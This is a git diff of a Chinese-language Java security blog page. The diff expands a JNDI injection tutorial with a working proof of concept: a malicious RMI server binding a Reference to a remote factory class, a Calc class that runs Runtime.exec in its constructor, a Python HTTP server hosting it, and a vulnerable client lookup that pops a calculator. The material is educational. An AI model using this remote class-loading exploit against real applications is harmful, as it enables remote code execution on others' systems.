@@ -24,8 +24,9 @@
 <meta property="og:description" content="JNDI注入漏洞基础知识JNDI（The Java Naming and Directory Interface）全称是 “Java命名和目录接口”，它是一类给 Java 应用程序提供命名和目录功能的 API 编程接口。 命名服务：把一个对象作为值跟命名服务上一个特定的名字绑定，可以通过这个名字到命名服务上查询并使用先前绑定的这个对象。 目录服务：一种特殊的命名服务，特殊在可以通过目录服务来对目录">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021116836.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309032217357.png">
 <meta property="article:published_time" content="2023-05-29T04:47:44.000Z">
-<meta property="article:modified_time" content="2023-09-02T15:51:16.226Z">
+<meta property="article:modified_time" content="2023-09-03T14:25:59.429Z">
 <meta property="article:author" content="fuming">
 <meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
@@ -222,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          3k 字
         
       </span>
     
@@ -233,7 +234,7 @@
         
         
         
-          9 分钟
+          17 分钟
         
       </span>
     
@@ -291,15 +292,34 @@
 <p>通过 JND 访问 RMI 服务：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// env 是用于创建 InitialContext 的环境变量属性配置</span><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        <span class="hljs-comment">// 创建一个 InitialContext</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;foo&quot;</span>;<br>        <span class="hljs-comment">// 把一个 String 对象和一个名字绑定</span><br>        context.bind(name,<span class="hljs-string">&quot;sample string&quot;</span>);<br>        <span class="hljs-comment">// 查询绑定的对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> context.lookup(name);<br>        System.out.println(name+<span class="hljs-string">&quot; is bound to: &quot;</span>+obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p><code>Reference</code>：它和要绑定的对象相关联，在绑定对象时，只需要将对象的 <code>Reference</code> 绑定到命名目录服务上，而不用绑定的原本的对象。</p>
-<p>当命名服务的客户端在查询到 <code>Reference</code> 时，会根据 <code>Reference</code> 里的信息还原得到原本绑定对象，</p>
-<p><strong>如果 <code>Reference</code> 中提供的信息时工厂类以及它的加载地址，那么客户端就会去对应的地址加载 Java 字节码进行构造和执行。</strong></p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>如果应用程序进行了 JNDI 查询，并且其查询的地址或名称可控，那么就会形成 JNDI 注入漏洞。其实就是 <code>lookup()</code> 参数可控。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用Refer加载远程Factory类"><a href="#利用Refer加载远程Factory类" class="headerlink" title="利用Refer加载远程Factory类"></a>利用Refer加载远程Factory类</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021116836.png" srcset="/img/loading.gif" lazyload alt="JNDI远程加载"></p>
-<p>构建 RMI 或者 LDAP 服务可以使用 <code>Marshalsec</code> 工具：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></li>
-</ul>
+<p><code>Reference</code> ：它和要绑定的对象相关联，在绑定对象时，只需要将对象的 <code>Reference</code> 绑定到命名目录服务上，而不用绑定的原本的对象。</p>
+<p>如果 <code>Reference</code> 中提供了工厂类以及它的加载地址，那么客户端就会去对应的地址加载 Java 字节码进行构造和执行。其构造方法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className,  String factory, String factoryLocation) <br></code></pre></td></tr></table></figure>
+
+<p><code>factory</code> 类需要继承 <code>UnicastRemoteObject</code> 且需要使用 <code>ReferenceWrapper</code> 类对 <code>Reference</code> 类或其子类对象进行远程包装成 <code>Remote</code> 类使其能够被远程访问。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>如果应用程序进行了 JNDI 查询，并且其查询的地址或名称可控，那么就会形成 JNDI 注入漏洞。</p>
+<p>当查询地址可控时，我们就可以搭建恶意服务，当 JNDI 访问该服务时会获取一个恶意的 <code>Reference</code>，然后 JNDI 解析该 <code>Reference</code> 后就会去恶意地址加载 Java 字节码进行构造和执行。</p>
+<p>简单来说，JNDI 注入原理就是 <code>lookup()</code> 参数可控，导致加载远程恶意类。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021116836.png" srcset="/img/loading.gif" lazyload alt="JNDI远程加载"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h4><p>攻击端搭建 <code>RMI</code> 服务，然后绑定一个恶意的 <code>Reference</code> ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, NamingException &#123;<br>        <span class="hljs-comment">// 创建注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Calc&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;jndi rmi Server start ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该  <code>Reference</code> 指向<code>http://127.0.0.1:8888/Calc.class</code>，然后就实现这个 <code>Calc.class</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后使用 <code>javac</code> 编译为 <code>Calc.class</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">javac Calc.java<br></code></pre></td></tr></table></figure>
+
+<p>启动 <code>http</code> 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m http.server 8888<br></code></pre></td></tr></table></figure>
+
+<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>客户端用于访问 RMI 服务，但其 <code>lookup()</code> 参数可控：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>rmi://127.0.0.1:1099/Calc</code> 是攻击者搭建的恶意 <code>RMI</code> 服务地址。</p>
+<p>启动客户端后弹出计算器：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309032217357.png" srcset="/img/loading.gif" lazyload alt="image-20230903221748106"></p>
 
                 
               </div>
@@ -397,9 +417,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-2/" title="Corrosion-2">
+                      <a href="/2023/05/29/Java%E5%AE%89%E5%85%A8/RMI/" title="Java RMI">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Corrosion-2</span>
+                        <span class="hidden-mobile">Java RMI</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
